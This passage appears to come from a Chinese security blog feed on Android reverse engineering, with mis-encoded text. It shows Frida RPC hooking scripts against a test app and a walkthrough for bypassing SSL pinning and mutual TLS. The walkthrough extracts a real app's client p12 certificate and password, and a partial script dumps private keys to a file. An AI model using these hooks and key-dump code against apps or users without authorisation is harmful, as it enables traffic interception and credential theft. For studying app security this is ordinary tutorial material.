class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// æœç´¢HookedObjectç±»å®ä¾‹</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found HookedObject:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// æŸ¥æ‰¾åˆ°å®ä¾‹åä¸»åŠ¨è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ho.getPasswd():&quot;</span>, instance.<span class="title function_">getPasswd</span>(<span class="string">&quot;123 ABC&quot;</span>));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HookedObject: search complete.&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* æµ‹è¯•å‡½æ•° */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I&#x27;m Frida_rpc.js!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* å¯¼å‡ºå‡½æ•°åˆ—è¡¨(å¯ä¾›pyè°ƒç”¨çš„) pyå‡½æ•°æ˜ å°„å’Œå®é™…å‡½æ•°å */</span></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">invokefunc</span>: invoke,</span><br><span class="line">    <span class="attr">testfunc</span>: test,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | scriptè„šæœ¬ä¿¡æ¯äº¤äº’å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡Usbè¿æ¥è®¾å¤‡</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ip:port è¿æ¥è®¾å¤‡</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ é€šè¿‡spawnæ–¹å¼å¯åŠ¨ ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ é€šè¿‡attachç°æœ‰è¿›ç¨‹æ–¹å¼å¯åŠ¨ ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°è„šæœ¬</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># åŠ è½½ä¿¡æ¯äº¤äº’handlerå‡½æ•°</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line"><span class="comment"># åŠ è½½è„šæœ¬</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter Command(y/t/n): &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;t&quot;</span>:</span><br><span class="line">        script.exports.testfunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="RPCåŠ¨æ€ä¿®æ”¹"><a href="#RPCåŠ¨æ€ä¿®æ”¹" class="headerlink" title="RPCåŠ¨æ€ä¿®æ”¹"></a>RPCåŠ¨æ€ä¿®æ”¹</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">getPasswd</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// éœ€è¦å‘é€ç»™pythonçš„å­—ç¬¦ä¸²ï¼šç”±å‡½æ•°çš„å‚æ•°å’Œç»“æœæ‹¼æ¥è€Œæˆ</span></span><br><span class="line">        <span class="keyword">var</span> string_to_send = <span class="variable language_">arguments</span>[<span class="number">0</span>] + <span class="string">&quot;:&quot;</span> + <span class="variable language_">this</span>.<span class="title function_">getPasswd</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        <span class="comment">// å‘é€åˆ°pythonç¨‹åº</span></span><br><span class="line">        <span class="title function_">send</span>(string_to_send);</span><br><span class="line">        <span class="comment">// åŒæ—¶è°ƒç”¨.wait()æ¥ é˜»å¡è¿è¡Œï¼Œç­‰å¾…æ¥æ”¶æ¶ˆæ¯</span></span><br><span class="line">        <span class="title function_">recv</span>(<span class="keyword">function</span> (<span class="params">received_json_objection</span>) &#123;</span><br><span class="line">            <span class="comment">// æ¥æ”¶æ¥çš„jsonå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;recv in js:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(received_json_objection))</span><br><span class="line">            <span class="comment">// æ‰“å°jsonçš„`my_data`,jsonä¸²æ¥è‡ªpython</span></span><br><span class="line">            string_to_recv = received_json_objection.<span class="property">my_data</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv:&quot;</span>, string_to_recv);</span><br><span class="line">        &#125;).<span class="title function_">wait</span>();</span><br><span class="line">        <span class="comment">// å°†æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²å½“ä½œè¢«hookå‡½æ•°çš„ç»“æœè¿”å›å›å»</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(string_to_recv);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | scriptè„šæœ¬ä¿¡æ¯äº¤äº’å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)  <span class="comment"># æ‰“å°å¾—åˆ°çš„ä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># è¾“å‡ºçš„ä¸º`none`?</span></span><br><span class="line">    <span class="comment"># å¦‚æœ`type`å­—æ®µä¸º&quot;send&quot; åˆ™æ˜¯jså‘æ¥çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="comment"># æ‰“å°jsonçš„`payload`å†…å®¹(jså‘é€è¿‡æ¥çš„å†…å®¹)</span></span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">        <span class="comment"># å‘scriptå‘é€æ¶ˆæ¯ï¼Œæ ¼å¼ä¸ºå­—å…¸</span></span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡Usbè¿æ¥è®¾å¤‡</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ip:port è¿æ¥è®¾å¤‡</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ é€šè¿‡spawnæ–¹å¼å¯åŠ¨ ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ é€šè¿‡attachç°æœ‰è¿›ç¨‹æ–¹å¼å¯åŠ¨ ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°è„šæœ¬</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># åŠ è½½ä¿¡æ¯äº¤äº’handlerå‡½æ•°</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line"><span class="comment"># åŠ è½½è„šæœ¬</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter `n` for leave: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> frida API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ“åŒ…ä¹‹åŒå‘è¯ä¹¦æ ¡éªŒ</title>
      <link href="/2024/07/07/%E6%8A%93%E5%8C%85%E4%B9%8B%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/"/>
      <url>/2024/07/07/%E6%8A%93%E5%8C%85%E4%B9%8B%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-åŒå‘è¯ä¹¦æ ¡éªŒ"><a href="#0x01-åŒå‘è¯ä¹¦æ ¡éªŒ" class="headerlink" title="0x01 åŒå‘è¯ä¹¦æ ¡éªŒ"></a>0x01 åŒå‘è¯ä¹¦æ ¡éªŒ</h1><p>åŒå‘è®¤è¯ï¼Œé¡¾åæ€ä¹‰ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½éœ€è¦éªŒè¯å¯¹æ–¹çš„èº«ä»½ï¼Œåœ¨å»ºç«‹Httpsè¿æ¥çš„è¿‡ç¨‹ä¸­ï¼Œæ¡æ‰‹çš„æµç¨‹æ¯”å•å‘è®¤è¯å¤šäº†å‡ æ­¥ã€‚å•å‘è®¤è¯çš„è¿‡ç¨‹ï¼Œå®¢æˆ·ç«¯ä»æœåŠ¡å™¨ç«¯ä¸‹è½½æœåŠ¡å™¨ç«¯å…¬é’¥è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œç„¶åå»ºç«‹å®‰å…¨é€šä¿¡é€šé“ã€‚åŒå‘é€šä¿¡æµç¨‹ï¼Œå®¢æˆ·ç«¯é™¤äº†éœ€è¦ä»æœåŠ¡å™¨ç«¯ä¸‹è½½æœåŠ¡å™¨çš„å…¬é’¥è¯ä¹¦è¿›è¡ŒéªŒè¯å¤–ï¼Œè¿˜éœ€è¦æŠŠå®¢æˆ·ç«¯çš„å…¬é’¥è¯ä¹¦ä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ç»™æœåŠ¡å™¨ç«¯è¿›è¡ŒéªŒè¯ï¼Œç­‰åŒæ–¹éƒ½è®¤è¯é€šè¿‡äº†ï¼Œæ‰å¼€å§‹å»ºç«‹å®‰å…¨é€šä¿¡é€šé“è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚è€Œå¸¸è§„çš„httpsåªæ˜¯å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯çš„è¯ä¹¦éªŒè¯æœåŠ¡å™¨çš„èº«ä»½ã€‚å› æ­¤åŒå‘è¯ä¹¦è®¤è¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šèƒ½å¢å¤§ä¸­é—´äººæ”»å‡»çš„éš¾åº¦å’Œæˆ‘ä»¬æŠ“åŒ…åˆ†æçš„éš¾åº¦ã€‚</p><p>ä¸‹å›¾ä¸ºåŒå‘è®¤è¯çš„æµç¨‹å›¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071751744.jpeg" alt="img"> </p><h1 id="0x02å®¢æˆ·ç«¯æ ¡éªŒ-VS-æœåŠ¡ç«¯æ ¡éªŒ"><a href="#0x02å®¢æˆ·ç«¯æ ¡éªŒ-VS-æœåŠ¡ç«¯æ ¡éªŒ" class="headerlink" title="0x02å®¢æˆ·ç«¯æ ¡éªŒ VS æœåŠ¡ç«¯æ ¡éªŒ"></a>0x02å®¢æˆ·ç«¯æ ¡éªŒ VS æœåŠ¡ç«¯æ ¡éªŒ</h1><h2 id="å®¢æˆ·ç«¯æ ¡éªŒ"><a href="#å®¢æˆ·ç«¯æ ¡éªŒ" class="headerlink" title="å®¢æˆ·ç«¯æ ¡éªŒ"></a>å®¢æˆ·ç«¯æ ¡éªŒ</h2><p>é€‚ç”¨åœºæ™¯ï¼šå¦‚æœæœåŠ¡å™¨æ•°é‡éå¸¸å¤šã€appç‰ˆæœ¬ä¼—å¤šï¼Œappåœ¨å®ç°Httpsçš„ç­–ç•¥ä¸Šé€šå¸¸ä¼šé‡‡å–å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡å™¨è¯ä¹¦çš„ç­–ç•¥ã€‚</p><p>å¸¸è§çš„æ ¡éªŒæ–¹å¼ï¼š</p><ul><li>X509TrustManageræ ¡éªŒ</li><li>certificatePinnerè¯ä¹¦ç»‘å®š</li><li>HostnameVerifieréªŒè¯</li></ul><h2 id="æœåŠ¡ç«¯æ ¡éªŒ"><a href="#æœåŠ¡ç«¯æ ¡éªŒ" class="headerlink" title="æœåŠ¡ç«¯æ ¡éªŒ"></a>æœåŠ¡ç«¯æ ¡éªŒ</h2><p>é€‚ç”¨åœºæ™¯ï¼šæ¯”å¦‚é“¶è¡Œã€å…¬å…±äº¤é€šã€æ¸¸æˆç­‰è¡Œä¸šï¼Œè¿™ç§æœåŠ¡å™¨é«˜åº¦é›†ä¸­ã€æ•°é‡æ¯”è¾ƒå°‘ï¼Œå…¨å›½å°±é‚£ä¹ˆå‡ å°ã€ä¸”appç‰ˆæœ¬è¾ƒå°‘ã€å¯¹åº”ç”¨çš„ç‰ˆæœ¬æ§åˆ¶çš„éå¸¸ä¸¥æ ¼çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨å°±ä¼šå¯¹appçš„è¯ä¹¦è¿›è¡Œæ ¡éªŒã€‚</p><p>å¦‚æœä½¿ç”¨äº†æœåŠ¡ç«¯æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯è¯´appå®¢æˆ·ç«¯ä¸€å®šæ˜¯å¤¹å¸¦äº†ä¸€å¼ è¯ä¹¦çš„ã€‚æœ€å¸¸ç”¨çš„å°±æ˜¯p12è¯ä¹¦äº†ã€‚</p><p>è·å–åˆ°å®¢æˆ·ç«¯æºå¸¦çš„è¯ä¹¦å’Œè¯ä¹¦å¯†ç ï¼Œè¿™æ ·å°†è¯ä¹¦å¯¼å…¥è¿›æŠ“åŒ…è½¯ä»¶ï¼Œå¦‚Charlesæˆ–burpä¸­å³å¯ã€‚</p><h1 id="0x03-å¯†é’¥è¯ä¹¦è‡ªåå®è·µ"><a href="#0x03-å¯†é’¥è¯ä¹¦è‡ªåå®è·µ" class="headerlink" title="0x03 å¯†é’¥è¯ä¹¦è‡ªåå®è·µ"></a>0x03 å¯†é’¥è¯ä¹¦è‡ªåå®è·µ</h1><p>æœåŠ¡ç«¯çš„æ ¡éªŒï¼šæ˜¯éœ€è¦æœåŠ¡ç«¯æ¥æ ¡éªŒå®¢æˆ·ç«¯æºå¸¦çš„è¯ä¹¦æ‘˜è¦æ˜¯å¦åˆæ³•ã€‚ã€‚ã€‚</p><p>å¦‚æœè¦ç»•è¿‡æœåŠ¡ç«¯æ ¡éªŒï¼Œé‚£ä¹ˆå°±éœ€è¦<strong>è·å–å®¢æˆ·ç«¯çš„è¯ä¹¦å’Œå¯†é’¥</strong>ã€‚ã€‚ã€‚</p><p>è¿™å—ä»¥ç½‘ä¸Šæœ€å¸¸åˆ†æçš„soul ä¸ºä¾‹ã€‚</p><h2 id="1-ç»•è¿‡SSLPinning"><a href="#1-ç»•è¿‡SSLPinning" class="headerlink" title="1. ç»•è¿‡SSLPinning"></a>1. ç»•è¿‡SSLPinning</h2><p>ç›´æ¥ä½¿ç”¨xposeæ’ä»¶ï¼Œå®‰è£…JustTrustMeç­‰è¿™äº›æ’ä»¶ï¼Œç»•è¿‡SSLPinningã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071804790.png" alt="image.png"> </p><p>å‘ç°æˆ‘ä»¬ä½¿ç”¨burpsuiteã€charlesç­‰æŠ“åŒ…å·¥å…·ä¹Ÿåªèƒ½æŠ“åˆ°ä¸Šè¡ŒåŒ…</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071805143.png" alt="image.png"> </p><h2 id="2-æœåŠ¡ç«¯æ ¡éªŒ"><a href="#2-æœåŠ¡ç«¯æ ¡éªŒ" class="headerlink" title="2. æœåŠ¡ç«¯æ ¡éªŒ"></a>2. æœåŠ¡ç«¯æ ¡éªŒ</h2><p>è§£å†³äº†æœåŠ¡å™¨è¯ä¹¦æ ¡éªŒå’Œssl piningåï¼Œå¯ä»¥æŠ“åˆ°ä¸Šè¡ŒåŒ…ï¼Œä½†è§‚å¯Ÿå“åº”æ—¶ï¼Œä¼šå‘ç°æœåŠ¡å™¨è¿”å›äº†400å¼‚å¸¸ä¿¡æ¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071806294.png" alt="image-20240707180621261"> </p><p>è¿™ä¸ªä¿¡æ¯å‘Šè¯‰æˆ‘ä»¬ï¼Œæˆ‘ä»¬ç”¨äº†æŠ“åŒ…å·¥å…·ä»¥åå‘å‡ºå»çš„åŒ…æ²¡æœ‰å¸¦ä¸Šå®¢æˆ·ç«¯è¯ä¹¦ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯æ‹’ç»å¤„ç†ã€‚</p><p>æƒ³è¦æ­£å¸¸æŠ“åŒ…ï¼Œå°±å¿…é¡»å¯¼å…¥å®¢æˆ·ç«¯è¯ä¹¦ï¼ŒåŒæ—¶éœ€è¦è¾“å…¥è¯ä¹¦å¯†ç ã€‚</p><h2 id="3-ç›´æ¥è·å–å®¢æˆ·ç«¯è¯ä¹¦"><a href="#3-ç›´æ¥è·å–å®¢æˆ·ç«¯è¯ä¹¦" class="headerlink" title="3. ç›´æ¥è·å–å®¢æˆ·ç«¯è¯ä¹¦"></a>3. ç›´æ¥è·å–å®¢æˆ·ç«¯è¯ä¹¦</h2><p>è¿™å°±è¯´æ˜appä½¿ç”¨äº†åŒå‘è¯ä¹¦æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯è¯´appå®¢æˆ·ç«¯ä¸€å®šæ˜¯å¤¹å¸¦äº†ä¸€å¼ è¯ä¹¦çš„ã€‚æœ€å¸¸ç”¨çš„å°±æ˜¯p12è¯ä¹¦äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨apktoolç­‰å·¥å…·åç¼–è¯‘apkæˆ–è€…ç›´æ¥è§£å‹ç¼©ã€‚è¯ä¹¦è¿™ç±»æ–‡ä»¶é€šå¸¸æ”¾åœ¨assetsç›®å½•ä¸‹é¢ï¼Œæˆ‘ä»¬åœ¨é‡Œé¢æ‰¾p12åç¼€åçš„æ–‡ä»¶å³å¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071806741.png" alt="image-20240707180652715"> </p><p>æŠŠè¿™ä¸ªæ–‡ä»¶å¤åˆ¶å‡ºæ¥ä¿å­˜åˆ°ä»»æ„ä½ç½®ï¼Œç¬¬ä¸€æ­¥å°±å®Œæˆäº†ã€‚ä½†å…‰æœ‰è¯ä¹¦ï¼Œä¸çŸ¥é“è¯ä¹¦å¯†ç ä¹Ÿæ²¡ç”¨ã€‚<br>æ‰€ä»¥ç¬¬äºŒéƒ¨ï¼šæ‰¾è¯ä¹¦å¯†ç ã€‚<br>ç›´æ¥dex2jaræˆ–è€…jadxç­‰å·¥å…·é€†å‘å‡ºjavaä»£ç ï¼Œæœç´¢å…³é”®è¯â€œclient.p12â€ï¼Œæˆ–è€…æœç´¢java.security.KeyStore.open()æ–¹æ³•ï¼ŒåŸºæœ¬èƒ½ç›´æ¥æ‰¾åˆ°ä½¿ç”¨è¯ä¹¦çš„åœ°æ–¹ã€‚æ­¤å¤„æˆ‘ä»¬æœç´¢â€œclient.p12â€:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071808917.png" alt="image-20240707180842889"> </p><p>å¦‚æœæ˜¯jadxå¯ä»¥å³é”®æŸ¥æ‰¾ä½¿ç”¨çš„åœ°æ–¹ï¼Œè·Ÿè¿›å»ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071809484.png" alt="image-20240707180905450"> </p><p>ä¸Šä¸‹æ–‡ä¸­å°±èƒ½æ‰¾åˆ°åŠ è½½è¯ä¹¦çš„åœ°æ–¹ï¼Œæ‰¾åˆ°loadæ–¹æ³•ï¼Œè¿™ä¸ªloadæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯ä¹¦æ–‡ä»¶æµï¼Œç¬¬äºŒä¸ªå‚æ•°å³ä¸ºè¯ä¹¦çš„å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦çŸ¥é“è¿™ç¬¬äºŒä¸ªå‚æ•°ä¼ è¿›æ¥çš„å€¼æ˜¯ä»€ä¹ˆå°±å¯ä»¥äº†ã€‚</p><p>ä»ä»£ç å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªå‚æ•°c2æ¥æºæ˜¯SoulNetworkSDK.cæ–¹æ³•ï¼Œcæ–¹æ³•è¿”å›å€¼å³ä¸ºæˆ‘ä»¬éœ€è¦çš„è¯ä¹¦å¯†ç ï¼Œè¿™æ—¶å€™åŠæ³•å°±å¤šäº†ï¼Œç›´æ¥ä½¿ç”¨Fridaå°è¯•hookå³å¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071810966.png" alt="image-20240707181053744"> </p><p>è¿™æ ·å°±è·å¾—äº†å®¢æˆ·ç«¯å­˜å‚¨çš„è¯ä¹¦å’Œå¯¹åº”çš„å¯†ç äº†ã€‚ã€‚ã€‚</p><h2 id="4-R0Captureè·å–è¯ä¹¦"><a href="#4-R0Captureè·å–è¯ä¹¦" class="headerlink" title="4. R0Captureè·å–è¯ä¹¦"></a>4. R0Captureè·å–è¯ä¹¦</h2><p>è¿™å—ç›´æ¥å‚è€ƒR0Captureä¸­çš„ä»£ç ï¼Œæ¥å®ç°è¯ä¹¦è·å–</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">storeP12</span>(<span class="params">pri, p7, p12Path, p12Password</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> X509Certificate = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>)  <span class="comment">//å¯¼å…¥X509Certificateç±»</span></span><br><span class="line">            <span class="keyword">var</span> p7X509 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(p7, X509Certificate);  <span class="comment">//è½¬æ¢ä¸ºX509Certificateç±»å‹</span></span><br><span class="line">            <span class="keyword">var</span> chain = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;java.security.cert.X509Certificate&quot;</span>, [p7X509])  <span class="comment">//åˆ›å»ºè¯ä¹¦é“¾æ•°ç»„</span></span><br><span class="line">            <span class="keyword">var</span> ks = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;PKCS12&quot;</span>, <span class="string">&quot;BC&quot;</span>);  <span class="comment">//åˆ›å»ºKeyStoreå¯¹è±¡</span></span><br><span class="line">            ks.<span class="title function_">load</span>(<span class="literal">null</span>, <span class="literal">null</span>);  <span class="comment">//åŠ è½½KeyStoreå¯¹è±¡</span></span><br><span class="line">            ks.<span class="title function_">setKeyEntry</span>(<span class="string">&quot;client&quot;</span>, pri, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>(), chain);  <span class="comment">//è®¾ç½®ç§é’¥å’Œè¯ä¹¦é“¾åˆ°KeyStoreå¯¹è±¡</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(p12Path);  <span class="comment">//åˆ›å»ºæ–‡ä»¶è¾“å‡ºæµ</span></span><br><span class="line">              ks.<span class="title function_">store</span>(out, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(p12Password).<span class="title function_">toCharArray</span>())  <span class="comment">//ä¿å­˜KeyStoreå¯¹è±¡åˆ°p12æ–‡ä»¶</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (exp) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(exp)  <span class="comment">//è¾“å‡ºå¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//åœ¨æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯çš„æƒ…å½¢ä¸‹ï¼Œå¸®åŠ©dumpå®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶ä¿å­˜ä¸ºp12çš„æ ¼å¼ï¼Œè¯ä¹¦å¯†ç ä¸ºr0ysue</span></span><br><span class="line">          <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getPrivateKey</span>.<span class="property">implementation</span> = <span 